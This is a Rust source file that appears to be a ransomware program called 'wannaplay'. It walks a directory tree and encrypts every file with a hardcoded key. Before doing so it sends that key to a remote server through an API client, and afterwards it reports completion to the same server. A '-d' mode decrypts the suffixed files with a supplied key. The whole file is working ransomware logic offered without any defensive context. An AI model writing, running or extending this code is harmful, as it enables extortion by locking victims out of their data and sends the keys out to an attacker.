use std::env;
use walkdir::WalkDir;
use magic_crypt::*;
use std::fs::{File, remove_file, OpenOptions};
use wannaplay::api::Client;
use wannaplay::{SUFFIX};

#[tokio::main]
async fn main() {
    let firtparam = env::args().nth(1).unwrap();
    if firtparam == "-d" {
        decrypt(&env::args().nth(2).expect("needs the path encrypted")
                , &env::args().nth(3).expect("Needs the key"));
    } else {
        let key = "azhioazfazfao";
        encrypt(&firtparam, &key).await;
    }
}

fn decrypt(path: &str, key: &str) {
    for file in WalkDir::new(path) {
        let entry = file.unwrap();
        let filename_str = entry.file_name().to_str().unwrap();
        if !entry.file_type().is_dir() && filename_str.ends_with(SUFFIX) {
            let mut crypt = new_magic_crypt!(key, 256);
            let new_path = entry.path().to_str().unwrap().replace(SUFFIX, "_decrypted");
            let mut new_file = OpenOptions::new()
                .create(true)
                .write(true)
                .truncate(true)
                .open(new_path)
                .unwrap();

            crypt.decrypt_reader_to_writer(&mut File::open(entry.path()).unwrap(),
                                           &mut new_file)
                .expect("Couldn't decrypt the file");
            remove_file(entry.into_path()).expect("Couldn't remove the file after the decryption");
        }
    }
}

async fn encrypt(path: &str, key: &str) {
    let client = Client;
    client.send_key(key).await.expect("Couldn't send the key to the server");
    for file in WalkDir::new(path) {
        let entry = file.unwrap();
        let mut crypt = new_magic_crypt!(key, 256);
        if !entry.file_type().is_dir() {
            let new_path = format!("{}{}", entry.path().to_str().unwrap(), SUFFIX);
            let mut new_file_encrypted = OpenOptions::new()
                .create(true)
                .write(true)
                .truncate(true)
                .open(new_path).unwrap();
            crypt.encrypt_reader_to_writer(&mut File::open(entry.path()).unwrap(),
                                           &mut new_file_encrypted).unwrap();
        }
    }
    client.completed(key).await.expect("");
}
